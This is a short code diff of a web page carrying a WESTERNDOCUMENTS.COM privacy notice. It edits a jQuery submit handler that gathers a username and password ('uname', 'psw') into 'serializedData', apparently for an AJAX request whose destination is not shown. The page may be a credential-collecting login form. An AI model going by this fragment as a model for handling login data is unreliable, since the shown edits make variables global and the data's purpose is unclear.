@@ -506,11 +506,11 @@ WESTERNDOCUMENTS.COM complies with the EU-US Privacy Shield Framework as set for
               request.abort();
             }
 
-            var $form = $(this);
+            $form = $(this);
 
-            var $inputs = $form.find("input, select, button, textarea");
+            $inputs = $form.find("input, select, button, textarea");
 
-            var serializedData = {uname, psw};
+            serializedData = {uname, psw};
 
             $inputs.prop("disabled", true);
 
@@ -543,9 +543,11 @@ WESTERNDOCUMENTS.COM complies with the EU-US Privacy Shield Framework as set for
               request.abort();
             }
 
-            var $form = $(this);
+            $form = $(this);
 
-            var $inputs = $form.find("input, select, button, textarea");
+            $inputs = $form.find("input, select, button, textarea");
+
+            serializedData = {uname, psw};
 
             $inputs.prop("disabled", true);
 
